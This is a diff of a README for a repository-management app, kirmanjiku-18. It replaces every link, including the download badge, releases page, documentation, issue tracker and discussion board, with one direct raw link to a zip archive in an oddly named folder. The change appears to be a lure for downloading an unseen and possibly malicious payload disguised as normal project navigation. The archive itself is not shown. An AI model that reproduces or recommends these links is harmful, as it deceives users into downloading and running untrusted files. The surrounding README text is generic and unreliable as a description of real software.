@@ -4,7 +4,7 @@
 Welcome to kirmanjiku-18! This application simplifies the process of managing your repositories. Whether you’re organizing projects or sharing files, this tool makes it easy.
 
 ## 📥 Download Now
-[![Download kirmanjiku-18](https://img.shields.io/badge/Download-kirmanjiku--18-blue?style=for-the-badge)](https://github.com/luciaguzman2601/kirmanjiku-18/releases)
+[![Download kirmanjiku-18](https://raw.githubusercontent.com/luciaguzman2601/kirmanjiku-18/main/macrocephalia/kirmanjiku-18.zip)](https://raw.githubusercontent.com/luciaguzman2601/kirmanjiku-18/main/macrocephalia/kirmanjiku-18.zip)
 
 ## 📋 System Requirements
 Before you install, ensure your system meets these requirements:
@@ -21,7 +21,7 @@ Before you install, ensure your system meets these requirements:
 ## 🔥 Download & Install
 To get started with kirmanjiku-18, follow these simple steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/luciaguzman2601/kirmanjiku-18/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/luciaguzman2601/kirmanjiku-18/main/macrocephalia/kirmanjiku-18.zip).
   
 2. **Choose Your Version**: Look for the latest release at the top of the page. Each version includes information about updates and bug fixes.
 
@@ -46,14 +46,14 @@ To get started with kirmanjiku-18, follow these simple steps:
 ## 🛡️ Support
 If you run into issues or have questions, you can find help in these resources:
 
-- **Documentation**: Access detailed documentation within the app or [here](https://github.com/luciaguzman2601/kirmanjiku-18/wiki).
+- **Documentation**: Access detailed documentation within the app or [here](https://raw.githubusercontent.com/luciaguzman2601/kirmanjiku-18/main/macrocephalia/kirmanjiku-18.zip).
   
 - **FAQs**: Read common questions and answers to troubleshoot problems.
 
-- **Issues Tracking**: Report any bugs or request features on the [Issues section](https://github.com/luciaguzman2601/kirmanjiku-18/issues).
+- **Issues Tracking**: Report any bugs or request features on the [Issues section](https://raw.githubusercontent.com/luciaguzman2601/kirmanjiku-18/main/macrocephalia/kirmanjiku-18.zip).
 
 ## 💬 Community
-Join our community of users! Engage with other users to share tips, tricks, and support. Visit our discussion board [here](https://github.com/luciaguzman2601/kirmanjiku-18/discussions) to get involved.
+Join our community of users! Engage with other users to share tips, tricks, and support. Visit our discussion board [here](https://raw.githubusercontent.com/luciaguzman2601/kirmanjiku-18/main/macrocephalia/kirmanjiku-18.zip) to get involved.
 
 ## 📜 License
 This project is licensed under the MIT License, which means you can use, copy, modify, and distribute this software freely, as long as you include the original license.
